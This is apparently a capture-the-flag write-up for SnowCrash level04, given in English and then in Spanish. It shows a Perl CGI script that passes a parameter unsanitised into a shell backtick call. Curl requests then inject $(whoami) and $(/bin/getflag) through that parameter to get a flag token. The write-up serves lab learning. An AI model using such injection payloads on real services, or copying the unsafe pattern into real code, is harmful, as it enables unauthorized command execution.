### LEVEL04

- I find a file named `level04.pl` in /home.
    ```bash
    level04@SnowCrash:~$ cat level04.pl
    #!/usr/bin/perl
    # localhost:4747
    use CGI qw{param};
    print "Content-type: text/html\n\n";
    sub x {
    $y = $_[0];
    print `echo $y 2>&1`;
    }
    x(param("x"));
    ```
- I check if the script is running.
    ```bash
    level04@SnowCrash:~$ nc -v localhost 4747
    Connection to localhost 4747 port [tcp/*] succeeded!
    ```
- It seems to be running.
- The script appears to echo the first parameter and display it.
    ```perl
    [...]
    print `echo $y 2>&1`;
    [...]
    ```

- I perform a curl with the parameter `HOLA`.
    ```bash
    level04@SnowCrash:~$ curl http://localhost:4747/?x='HOLA'
    HOLA
    ``` 

- I try to see if I can execute any commands.
    ```bash
    level04@SnowCrash:~$ curl http://localhost:4747/?x='$(whoami)'
    level04
    ``` 

- We see that we have command execution.
- Let's try to obtain the flag.
    ```bash
    level04@SnowCrash:~$ curl http://localhost:4747/?x='$(/bin/getflag)'
    Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
    ``` 

---

### LEVEL04
- Encuentro en /home/level04 un fichero level04.pl
    ```bash
    level04@SnowCrash:~$ cat level04.pl
    #!/usr/bin/perl
    # localhost:4747
    use CGI qw{param};
    print "Content-type: text/html\n\n";
    sub x {
    $y = $_[0];
    print `echo $y 2>&1`;
    }
    x(param("x"));
    ```

- Pruebo si el script está en ejecución:
    ```bash
    level04@SnowCrash:~$ nc -v localhost 4747
    Connection to localhost 4747 port [tcp/*] succeeded!
    ```
- Parece que está en ejecución
- El script parece que hace echo sobre el primer parametro y lo muestra
    ```perl
    [...]
    print `echo $y 2>&1`;
    [...]
    ```
- Hago un curl con el parametro `HOLA`
    ```bash
    level04@SnowCrash:~$ curl http://localhost:4747/?x='HOLA'
    HOLA
    ``` 
- Pruebo a ver si puedo ejecutar algún comando
    ```bash
    level04@SnowCrash:~$ curl http://localhost:4747/?x='$(whoami)'
    level04
    ``` 

- Vemos que tenemos ejecución de comandos
- Probamos a obtener la flag
    ```bash
    level04@SnowCrash:~$ curl http://localhost:4747/?x='$(/bin/getflag)'
    Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
    ``` 
